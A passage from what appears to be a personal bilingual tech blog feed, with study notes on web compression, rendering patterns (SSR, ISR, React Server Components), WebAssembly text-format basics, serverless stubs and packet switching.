<ahref="https://cs.stanford.edu/people/eroberts/courses/soco/projects/data-compression/lossless/lz77/algorithm.htm">LZ77algorithm</a> and <ahref="https://cs.stanford.edu/people/eroberts/courses/soco/projects/data-compression/lossless/huffman/algorithm.htm">Huffmancoding</a> on blocks of data in an input data stream.</p><p>The LZ77 algorithm identifies duplicate strings and replaces themwith a backreference, which is a pointer to the place where itpreviously appeared, followed by the length of the string. Subsequently,Huffman coding identifies the commonly used references and replaces themwith references with shorter bit sequences. Longer bit sequences areused to represent infrequently used references.</p><p>All major browsers support Gzip. The <ahref="https://github.com/google/zopfli">Zopfli</a> compression algorithmis a slower but improved version of Deflate/Gzip, producing smaller GZipcompatible files. It is most suitable for static compression, where itcan provide more significant gains.</p></li></ol><figure><imgsrc="https://www.patterns.dev/_next/image?url=%2Fimg%2Fcompression%2Fcompressingjav--zhfjmtap05.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ol start="2" type="1"><li>Brotli</li></ol><h4 id="check-compression">Check Compression</h4><p>Chrome -&gt; DevTools -&gt; network -&gt; Headers. DevTools displaysthe content-encoding used in the response, as shown below.</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=%2Fimg%2Fcompression%2Fcompressingjav--4gwntp0et8s.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>The lighthouse report includes a performance audit for "Enable TextCompression" that checks for text-based resource types received withoutthe content-encoding header set to ‘br', ‘gzip' or ‘deflate'. Lighthouseuses Gzip to compute the potential savings for the resource.</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=%2Fimg%2Fcompression%2Fcompressingjav--qmwdq1rskk8.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="trade-off">trade off</h4><ol type="1"><li><p>gain(1+2) &gt;= gain(1) + gain(2):放在一起压缩的收益比分开压缩的收益更好</p><p>Limited local data suggests a 5% to 10% loss for smaller chunks. Theextreme case of unbundled chunks shows a 20% increase in size.Additional IPC, I/O, and processing costs are attached to each chunkthat gets shared in the case of larger chunks. The v8 engine has a 30Kstreaming/parsing threshold. This means that all chunks smaller than 30Kwill parse on the critical loading path even if it isnon-critical.</p></li><li><p>但是分开压缩对缓存有好处：</p><ol type="1"><li>如果某个资源发生改变，分开压缩的模块的情况下只需要重新获取对应的最新资源即可；但是如果是大文件压缩，则需要重新获取整个资源；</li><li>另外，按需加载的情况下，我们也是尽可能只需要尽量小的资源，如果整个都压缩在一起了，势必也会不好，下载了很多无用的部分</li></ol></li></ol><p>As a result of this trade-off, the maximum number of chunks usedtoday by most production apps is around 10. This limit needs to beincreased to support better caching and de-duplication for apps withlarge amounts of JavaScrip</p><h2 id="render-patterns">Render Patterns</h2><p>UX friendly</p><p><img src="https://www.patterns.dev/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fddxwdqwkr%2Fimage%2Fupload%2Ff_auto%2Fv1660456914%2Fpatterns.dev%2Fweb-vitals.png&w=3840&q=75" alt="img" style="zoom: 25%;" /></p><p>DX friendly</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fddxwdqwkr%2Fimage%2Fupload%2Ff_auto%2Fv1658990025%2Fpatterns.dev%2F5.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>trade off:</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fddxwdqwkr%2Fimage%2Fupload%2Ff_auto%2Fv1658990025%2Fpatterns.dev%2F6.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>The Chrome team <ahref="https://developers.google.com/web/updates/2019/02/rendering-on-the-web">hasencouraged</a> developers to consider static or server-side renderingover a full rehydration approach. Over time, progressive loading andrendering techniques, by default, may help strike a good balance ofperformance and feature delivery when using a modern framework.</p><h3 id="static-rendering">static Rendering</h3><ul><li>项目build的html就生成好了，直到下一次build之前都不会发生改变，所以页面比较死板</li><li>速度特别快</li><li>cdn缓存策略加速用户访问</li><li>适合不常改变的幂等性网页(不论怎么请求结果都是一样的)</li><li>不存在re-layout and repainting</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_10.18.37_AM_bhybvb.webm</p><h3 id="static-rendering-with-client">static Rendering with client</h3><ul><li>改变了static rendering的非动态数据的特点，允许请求动态数据</li><li>同时为例避免re-layout andrepainting，使用了骨架屏方案，防止数据渲染的时候引起UI变动；</li><li>但是骨架屏的大小要准确</li><li>给予了服务器压力，因为现在要实时获取数据了，每一个请求都需要server侧回应</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_2.55.30_PM_r0jvez.webm</p><h3 id="static-with-getstaticprops">static with getStaticProps</h3><ul><li>在build时期就可以动态的去获取数据，减少了一部分在客户端的请求</li><li>但是这些请求与用户互关(not user-specific)</li><li>但是如果这样的请求过多的话，build时间很能会很长</li><li>这种方法也只适用于在构建时不经常更新数据的情况</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_3.06.26_PM_djvt57.webm</p><h3 id="incremental-sattic-regeneration">Incremental satticregeneration</h3><p>对于上面build time的问题(static with getStaticProps)和动态数据(staticRendering with client)的问题，可以使用这个方法解决</p><ul><li>和前面的思路不一样，之前是build的时候一次性产生所有静态资源，而现在是请求一个html，就重新生成一个（有优先从缓存里取），一般配合servelessfunction一起使用（减少了build time），数据仍然是在server侧生成的</li><li>不需要build，但是似乎需要重新部署到cdn，为了避免重新部署，定时校验静态资源缓存</li><li>Thus, only the first user is likely to have a poorer experience forpages that are not pre-rendered.</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_3.49.59_PM_deygni.webm</p><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/updated_jvhqnv.webm</p><h3 id="on-demand-incremental-sattic-regeneration">On-demand Incrementalsattic regeneration</h3><ul><li><p>not user-specific</p></li><li><p>不是定时更新cdn，而是基于特定事件</p></li></ul><h3 id="ssr">SSR</h3><p>With server-side rendering, we generate the HTML for every request.This approach is most suitable for pages containing highly personalizeddata, for example, data based on the user cookie or generally any dataobtained from the user's request. It's also suitable for pages thatshould be render-blocking, perhaps based on authentication state.</p><ul><li>可以和csr一样包含了user-specific data</li><li>use request-based data, like cookie</li><li>should be render-blocking</li><li>The time it takes to start up the lambda, known as the long coldboot, is a common issue with serverless functions. Also, connections todatabases can be slow. You should also not call a serverless functionlocated on one side of the planet from the other.</li><li>server侧压力大了，优化方法：<ul><li><strong>Deploy databases in the same region as your serverlessfunction</strong>：减少查询时间</li><li><strong>Execution time of<code>getServerSideProp</code></strong>：The page generation does notstart until the data from <code>getServerSideProps</code> is available.Hence, we must ensure that the <code>getServerSideProps</code> methoddoesn't run too long.</li><li><strong>Add <code>Cache-control</code> headers toresponses</strong></li><li><strong>Upgrade server hardware</strong></li></ul></li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_5.31.41_PM_oxsq12.webm</p><h3 id="csr">CSR</h3><p><模板 js执行的逻辑会挂在这个节点下面></p><script><p>如果这的逻辑很长或者下载该脚本及其依赖脚本时间过长，就会导致白屏</p><p>SSR:</p><p>实际上SSR的一定有的结构如下：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;root&#x27;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><span class="hljs-template-variable">&#123;renderToHtml(content)&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;client.js&#x27;</span> /&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span></span><br></code></pre></td></tr></table></figure><p>把server侧的整个html交给了客户侧的js管理，但是这样每次请求一个新页面，就会重新刷新一次，它的粒度不够细，RSC可以解决这个问题。</p><p>关于SSR的实践的几个点：</p><ul><li>同构是什么？server无法处理的一些事情，如事件绑定交给客户端</li><li>客户端和server侧同步store，为什么要同步呢？</li><li>路由的问题：如果要使用局部刷新的话，ssr要写两份路由，一份是客户端的路由，一份是对应的服务端路由</li></ul><p>SSR的实践：</p><p><a href="https://juejin.cn/post/7065303971723739144">React SSR初实践（一） - 掘金 (juejin.cn)</a></p><h3 id="react-server-component">React Server Component</h3><p>一句话来说：RSC可以使得客户端的React树既有客户端组建也有服务端组件，所以整个React树是可以实现局部刷新的</p><p><a href="https://juejin.cn/post/6931902782131666951#heading-7">ReactServer Components到底行不行？ - 掘金 (juejin.cn)</a></p><p><a href="https://zhuanlan.zhihu.com/p/470449193">React servercomponent 深入指南 - 知乎 (zhihu.com)</a></p><h3 id="http-streaming">HTTP streaming</h3><p>[普通的请求结果：0 or 1，stream：随时使用，挤牙膏]</p><p>With Edge SSR, we can stream parts of the document as soon as they'reready and hydrate these components granularly. This reduces the waitingtime for users as they can see components as they stream in one byone.</p><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_5.48.20_PM_auurip.webm</p><p>结合：静态数据网页static rendering，user-specific serverrendering</p><p><a href="https://zhuanlan.zhihu.com/p/98848420">从 Fetch 到 Streams—— 以流的角度处理网络请求 - 知乎 (zhihu.com)</a></p><h3 id="some-ideas-in-reacting">Some ideas in Reacting</h3><h3 id="关于react性能优化">关于React性能优化</h3><h3 id="关于写组件的一些体会">关于写组件的一些体会</h3><p>headless UI:无UI组件，表示仅提供UI元素和交互的数据状态逻辑，但不提供标记(html元素)，样式</p><p>暴露状态和一些控制逻辑给用户？</p><p>但是状态在内部，用户不需要管，以及控制该状态的api也已经给用户了，具体如何使用该api控制该状态，进而控制UI全权交给了用户</p><p>https://www.patterns.dev/posts/hoc-pattern</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/06/29/%E4%BD%95%E4%B8%BAwasm%EF%BC%9F/"/>
    <url>/emocoder/2023/06/29/%E4%BD%95%E4%B8%BAwasm%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="何为wasm">何为wasm？</h2><p>WebAssembly 是一种新的编码方式，可以在现代的网络浏览器中运行 －它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，<strong>并为诸如C / C ++等语言提供一个编译目标</strong>，以便它们可以在 Web上运行。它也被设计为可以<strong>与 JavaScript共存</strong>，允许两者一起工作。</p><p>对于网络平台而言，WebAssembly 具有巨大的意义——这为客户端 app提供了一种在网络平台以接近本地速度的方式运行多种语言编写的代码的方式；在这之前，客户端app 是不可能做到的。</p><p>WebAssembly 被设计为可以和 JavaScript 一起协同工作——通过使用WebAssembly 的 JavaScript API，你可以把 WebAssembly 模块加载到一个JavaScript 应用中并且在两者之间共享功能。这允许你在同一个应用中利用WebAssembly 的性能和威力以及 JavaScript的表达力和灵活性，即使你可能并不知道如何编写 WebAssembly 代码。</p><p><strong>webassembly的目标</strong></p><ul><li>快速、高效、可移植</li><li>WebAssembly是一门低阶语言，但是它有确实有一种人类可读的文本格式（wat格式），这允许通过手工来写代码，看代码以及调试代码。</li><li>保持安全——WebAssembly被限制运行在一个安全的沙箱执行环境中。像其他网络代码一样，它遵循浏览器的同源策略和授权策略</li><li>不破坏网络——WebAssembly的设计原则是与其他网络技术和谐共处并保持向后兼容</li></ul><p>webassembly如何适应网络平台，从两方面入手：</p><ul><li>提供运行时宿主环境：vm</li><li>可以使用网络平台的一些api：如DOM, CSSOM, WebGL, IndexDB,WebAudio</li></ul><h2 id="前景和发展有什么用">前景和发展，有什么用？</h2><h2 id="原理大致怎么做的">原理，大致怎么做的？</h2><h3 id="常规使用方式">常规使用方式</h3><p>(使用基于llvm的语言)如C++编写程序 =&gt; 借用编译工具(Emscripten)=&gt; wassm格式的代码 =&gt; 用来加载和运行该模块的JavaScript”胶水“代码</p><figure><imgsrc="https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts/emscripten-diagram.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ol type="1"><li>Emscripten 首先把 C/C++提供给 clang+LLVM——一个成熟的开源C/C++编译器工具链，比如，在 OSX 上是 XCode 的一部分。</li><li>Emscripten 将 clang+LLVM 编译的结果转换为一个.wasm 二进制文件。</li><li>就自身而言，WebAssembly 当前不能直接的存取 DOM；它只能调用JavaScript，并且只能传入整形和浮点型的原始数据类型作为参数。这就是说，为了使用任何Web API，WebAssembly 需要调用到 JavaScript，然后由 JavaScript 调用 WebAPI。因此，Emscripten 创建了 HTML 和 JavaScript胶水代码以便完成这些功能。</li></ol><h3 id="直接写wasm">直接写wasm</h3><p>就像真实的汇编语言一样，WebAssembly的二进制格式也有文本表示——两者之间 1:1对应。你可以手工书写或者生成这种格式然后使用这些工具（<ahref="http://webassembly.org/getting-started/advanced-tools/">WebAssembytext-to-binary tools</a>）中的任何一个把它转换为二进制格式。</p><h3 id="wasm基本概念">wasm基本概念</h3><p>其实上面提到了js作为胶水代码，那必然有相关的概念，</p><p>模块：</p><p>内存：</p><p>表格：</p><p><strong>实例</strong>：</p><h2 id="wasm基本概念-1">wasm基本概念</h2><h3 id="c-wassm">C++ =&gt; wassm</h3><p>Wassm: 机器理解的语言</p><p>wat: 人可理解的wassm</p><p>wassm可以通过一些工具（）转为人可阅读的一段文本，这段文本是树状的表达式，类似抽象语法树(AST)，树里的每个节点都是用括号括起来的，并且每个节点都有自己的标记，代表属于语言的某一部分（是函数？还是参数？等等），而没有用括号包裹的一般都是operation，如下：</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs wasm"><span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">f32</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">local</span> <span class="hljs-type">f64</span><span class="hljs-punctuation">)</span><br>  <span class="hljs-keyword">local.get</span> <span class="hljs-number">0</span><br>  <span class="hljs-keyword">local.get</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">local.get</span> <span class="hljs-number">2</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>这是一个函数节点，函数节点包含3个子节点（2个参数节点和一个局部变量节点，参数的标记是param，局部变量1的标记是local），并且还有3个operation（下面会提到一些基本的operation）。</p><p>常见节点：</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs wasm"><span class="hljs-keyword">module</span><br><span class="hljs-keyword">param</span><br><span class="hljs-keyword">result</span><br><span class="hljs-keyword">export</span>: <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;add&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$add</span><span class="hljs-punctuation">))</span>, 导出函数<span class="hljs-variable">$add</span>, 暴露对外部语言的一个接口：add，简写方式：在定义函数的时候即刻导出<br><br><span class="hljs-keyword">import</span>: <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;console&quot;</span> <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$log</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)))</span>, wassm提供了二级命名空间，如这里的console.log，代表的是即将导入的外部语言的console模块下的log变量，后面<span class="hljs-keyword">func</span> <span class="hljs-title function_">$log</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span>是导入函数的签名，必须要和原语言的类型一致，对于js这种语言其实不起作用。<br>WebAssembly has a two-level namespace so the <span class="hljs-keyword">import</span> statement here is saying that we&#x27;re asking to <span class="hljs-keyword">import</span> the log function from the console module. <br><br>Imported functions are just like normal functions: they have a signature that WebAssembly validation checks statically, and they are given an index and can be named and called.<br><br>JavaScript functions have no notion of signature, so any JavaScript function can be passed, regardless of the <span class="hljs-keyword">import</span>&#x27;s declared signature. （会忽略js的函数签名）<br><br>Once a <span class="hljs-keyword">module</span> declares an <span class="hljs-keyword">import</span>, the caller of WebAssembly.instantiate<span class="hljs-punctuation">()</span> must pass in an <span class="hljs-keyword">import</span> object that has the corresponding properties.<br></code></pre></td></tr></table></figure><p>operation：</p><p>read：</p><p>​ 按索引读（其实就是按照函数栈内的偏移量读）：The instruction<code>local.get 0</code> would get the i32 parameter,<code>local.get 1</code> would get the f32 parameter, and<code>local.get 2</code> would get the f64 local.</p><p>​ 具名读：write <code>local.get $p1</code> instead of<code>local.get 0</code>, etc</p><p>​具名读速度应该会慢点，只是方便开发人员阅读，因为最终还是要转成机器可理解的方式</p><p>write：</p><p>常见opertaion</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">call <span class="hljs-variable">$&#123;</span>name&#125;<br><span class="hljs-variable">$&#123;</span><span class="hljs-keyword">type</span>&#125;.const <br></code></pre></td></tr></table></figure><p>在讲write操作之前，讨论关于函数的计算模型——堆栈机，因为write操作比较抽象，就是一条简单的指令；</p><p>来看写操作：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-type">i32</span>.<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>表示基于i32类型的，从栈内取出两个数字相加并放回栈内</p><blockquote><p>如果类型不对会怎么样？</p></blockquote><p>在js里使用wassm（涉及相关api，memory，global）</p><p>在wassm里使用js或者其他语言（涉及导入声明和instance传入的一个对象）</p><p><strong>全局变量</strong></p><p>WebAssembly has the ability to create global variable instances,accessible from both JavaScript and importable/exportable across one ormore <ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Module"><code>WebAssembly.Module</code></a>instances. This is very useful, as it allows dynamic linking of multiplemodules.</p><p>wassm可以创建全局变量，这些变量可以来自js或者可导入/导出的<ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Module"><code>WebAssembly.Module</code></a>instances。</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs wasm"><span class="hljs-punctuation">(</span><span class="hljs-keyword">module</span><br>   <span class="hljs-punctuation">(</span><span class="hljs-keyword">global</span> <span class="hljs-variable">$g</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;js&quot;</span> <span class="hljs-string">&quot;global&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">mut</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">))</span> // 声明来自js的全局变量<br>   <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;getGlobal&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> // 函数<span class="hljs-number">1</span><br>        <span class="hljs-punctuation">(</span><span class="hljs-keyword">global.get</span> <span class="hljs-variable">$g</span><span class="hljs-punctuation">))</span><br>   <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;incGlobal&quot;</span><span class="hljs-punctuation">)</span>// 函数<span class="hljs-number">2</span>，导出<br>        <span class="hljs-punctuation">(</span><span class="hljs-keyword">global.set</span> <span class="hljs-variable">$g</span><br>            <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.add</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">global.get</span> <span class="hljs-variable">$g</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.const</span> <span class="hljs-number">1</span><span class="hljs-punctuation">))))</span><br><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p><strong>内存操作</strong></p><p>Memory:</p><p>The above example is a pretty terrible logging function: it onlyprints a single integer! What if we wanted to log a text string? To dealwith strings and other more complex data types, WebAssembly provides<strong>memory</strong> (although we also have <ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format#reference_types">Referencetypes</a> in newer implementation of WebAssembly). According toWebAssembly, <strong>memory is just a large array of bytes</strong> thatcan grow over time. WebAssembly contains instructions like<code>i32.load</code> and <code>i32.store</code> for reading and writingfrom <ahref="https://webassembly.github.io/spec/core/exec/index.html#linear-memory">linearmemory</a>.</p><p>对应到js里，其实就是ArrayBuffer</p><p>So a string is just a sequence of bytes somewhere inside this linearmemory. Let's assume that we've written a suitable string of bytes tomemory; how do we pass that string out to JavaScript?</p><p>Wassm提供了memory接口，可以暴露wassm的memory给js消费，js可以用ArrayBuffer相关api进行消费</p><p>当然也可以创建memory给wassm使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">js:</span><br>WebAssembly.Memory<br><br><span class="hljs-symbol">wassm:</span><br>(import <span class="hljs-string">&quot;js&quot;</span> <span class="hljs-string">&quot;mem&quot;</span> (memory <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><blockquote><p><strong>Note:</strong> Above, note the double semicolon syntax(<code>;;</code>) for allowing comments in WebAssembly files.</p></blockquote><p><strong>类型</strong></p><p>WebAssembly currently has four available <em>number types</em>:</p><ul><li><code>i32</code>: 32-bit integer</li><li><code>i64</code>: 64-bit integer</li><li><code>f32</code>: 32-bit float</li><li><code>f64</code>: 64-bit float</li></ul><h3 id="vector-types"><ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format#vector_types">Vectortypes</a></h3><ul><li><code>v128</code>: 128 bit vector of packed integer, floating-pointdata, or a single 128 bit type.</li></ul><h3 id="reference-types"><ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format#reference_types">Referencetypes</a></h3><p>bulk mem operations</p><p>seven new built-in operations are provided for bulk memory operationssuch as copying and initializing, to allow WebAssembly to model nativefunctions such as <code>memcpy</code> and <code>memmove</code> in a moreefficient, performant way.</p><ul><li><code>data.drop</code>: Discard the data in an data segment.</li><li><code>elem.drop</code>: Discard the data in an element segment.</li><li><code>memory.copy</code>: Copy from one region of linear memory toanother.</li><li><code>memory.fill</code>: Fill a region of linear memory with agiven byte value.</li><li><code>memory.init</code>: Copy a region from a data segment.</li><li><code>table.copy</code>: Copy from one region of a table toanother.</li><li><code>table.init</code>: Copy a region from an element segment.</li></ul><p><strong>多线程</strong></p><p>https://github.com/AllenWrong/Self-learning-Record/blob/master/CS143%20Compiler.md</p><p>Sidecar:</p><p>https://learn.microsoft.com/en-us/azure/architecture/patterns/sidecar</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>faas与severless</title>
    <link href="/emocoder/2023/06/22/faas%E4%B8%8Eseverless/"/>
    <url>/emocoder/2023/06/22/faas%E4%B8%8Eseverless/</url>
    
    <content type="html"><![CDATA[<p>faas</p><p>是什么</p><p>为什么？</p><p>有什么用？</p><p>数据编排——充当BFF =&gt; 演化成了SFF(Serverless For Frontend）</p><p>优点：我们的函数启动后，调用后端提供的元数据接口，并将返回的元数据加工成前端需要的数据格式；我们的FaaS 函数完全就可以休息了。</p><p>利用快速冷启动的特性</p><p>缺点：</p><p>SSR：——充当SSR</p><p>severless vs faas ?</p><p>fass 与轻服务</p><p>https://tech.bytedance.net/articles/7179520424416378938?from=lark_all_search#SuIKdSm6CoUCaExw7WKcrZXin3f</p><p>https://bytedance.feishu.cn/wiki/wikcn8nGAVxRMC1vBYF1tzeAAbg#</p><p>https://blog.csdn.net/li1669852599/article/details/108795172</p><p>https://blog.csdn.net/li1669852599/article/details/108838179</p><p>https://zhuanlan.zhihu.com/p/260440613</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>faas</title>
    <link href="/emocoder/2023/06/22/faas/"/>
    <url>/emocoder/2023/06/22/faas/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 の 3 Packet Switching</title>
    <link href="/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/"/>
    <url>/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="分组交换">分组交换</h2><p>特点：</p><ul><li>Packets被独立地路由，通过查找当前路由的局部路由表</li><li>所有的Packets共享一个完整的Link</li><li>路由不需要维护通信状态</li><li>路由是有缓存的<ul><li>缓存在以下情况下会存在Packets：<ul><li>When two or more packets arrive at the same time</li><li>During periods of congestion</li></ul></li></ul></li></ul><h2 id="curcuit-switching">Curcuit switching</h2><p>建议了解下通信历史</p><p>建议了解下网络历史</p><p>特点：</p><ul><li>Each call has its own private, guaranteed, isolated data rate fromend-to-end</li><li>A call has three phases:<ul><li>Establish circuit form end-to-end</li><li>Communicate</li><li>Close circuit</li></ul></li><li>Originally, a circuit was end-to0end physical wire</li><li>Nowdays, a circuit is like a virtual private wire</li></ul><p>能否在计算机通信使用Curcuit switching</p><ul><li>Inefficient:计算机通信是爆炸式的，通信需要比较高的速度，不然影响体验</li><li>Diverse Rates: 计算机通信在不同情况下速度是不同的，比如 a web serverstreaming video at 6Mb/s, typing at a. Character per second. A fixedrate circuit will not be much use.</li><li>State management. Curcuit switch maintain per-communication state,which must be managed.</li></ul><blockquote><p>Efficient use of expensive links</p><ul><li>Links were assumed to be expensive and scarce</li><li>Packet switching allows many, bursty flows to shae the same linkefficiently</li><li>Circuit switching is rarely used for data networks, ... because ofvery inefficient use of the links</li></ul><p>(PS:其实就是说分组交换允许共享链接，而电报交换每次链接都是一个新的链路，重新构建一个Link代价是比较大的)</p><p>Resilience to failure of links &amp; routerss</p><ul><li>For high reliability, [the internet] was to be a datagram subnet, soif some lines and [routers] were destroyed, messages could be ...rerouted</li></ul><p>(PS: 分组交换即使中间路由损坏了，也可以通过其他路由重新路由)</p></blockquote><p>排队机制是ATM交换中一个极为重要的内容，队列的溢出会引起信元丢失，信元排队是交换时延和时延抖动的主要原因，因此排队机制对ATM交换机性能有着决定性的影响。基本排队机制有三种：输入排队、输出排队和中央排队。这三种方式各有缺点，如输入排队有信头阻塞，交换机的负荷达不到60%；输出排队存储器利用率低，平均队长要求长，而中央排队存储器速率要求高、存储器管理复杂。同时，三种方式有各有优点，输入队列对存储器速率要求低，中央排队效率高，输出队列则处于两者之间，所以在实际应用中并没有直接利用这三种方式，而是加以综合，采取了一些改进的措施。</p><h2 id="分包交换">分包交换</h2><h3 id="what-does-a-packet-switch-look-like">what does a packet switchlook like ?</h3><h3 id="what-does-a-packet-switch-do">what does a packet switch do?</h3><ul><li>以太网交换机(Ethernet switch)</li><li>因特网路由器(Internet router)</li></ul><h3 id="how-address-lookup-works">How address lookup works</h3><ul><li>以太网交换机(Ethernet switch)</li><li>因特网路由器(Internet router)</li></ul><p>以太网交换机：</p><figure><img src="https://img1.sdnlab.com/%20/wp-content/uploads/2020/11111.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617171950912.png"alt="image-20230617171950912" /><figcaption aria-hidden="true">image-20230617171950912</figcaption></figure><p><strong>Ethernet 